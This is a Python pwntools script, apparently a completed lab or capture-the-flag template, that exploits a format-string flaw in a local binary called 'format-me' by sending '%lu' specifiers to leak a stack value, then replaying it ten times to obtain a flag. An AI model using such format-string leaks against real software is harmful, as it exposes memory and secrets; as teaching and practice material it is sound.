#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./format-me")

r = process([exe.path])
# r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line

for _ in range(10):
    # Add your code Here
    # r.recvuntil(b"xxx") # Think about what should be received first?
    r.recvuntil(b"Recipient? ")
    
    # r.sendline(b"xxx") # Add your format string code here!
    # r.sendline(b"%lx.%lx.%lx.%lx")
    r.sendline(b"%lu.%lu.%lu.%lu.%lu.%lu.%lu.%lu.%lu")
    leak = r.recvline()

    # print(leak)

    # for i in range(1, 20): # Try offsets from 1 to 20
    #     p = process('./format-me')
    #     payload = f"%{i}$lu"
    #     p.recvuntil(b"Recipient? ")
    #     p.sendline(payload.encode())
    #     result = p.recvline()
    #     print(f"Offset {i}: {result}")
    #     continue


    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
    init_str = str(leak)
    sub_str = '.'
    idx_1 = -1
    for i in range(0, 8): 
        idx_1 = init_str.find(sub_str, idx_1 + 1)
    idx_2 = init_str.find(sub_str, idx_1 + 1)

    # val = leak[idx_1 - 1:idx_2 - 2] # you need to fill in idx_1, and idx_2 by yourself
    val = leak [idx_1 - 1:len(leak) - 1]
    # code_hex = leak.split(b'.')[9]
    # val = int(code_hex, 16)
    # print("Val:", val)
    # print("int(val):", int(val))
    # print("str(val).encode():", str(val).encode())
    # print("str(val):", str(val))

    # r.recvuntil(b"xxx") #Think about what should be received?
    r.recvuntil(b"Guess? ")

    r.sendline(val)
    # r.sendline(str(val).encode())
    r.recvuntil(b"Correct")
    # r.recvuntil(b"Correct code! Package sent.\n")

r.recvuntil(b"Here's your flag: ")
r.interactive()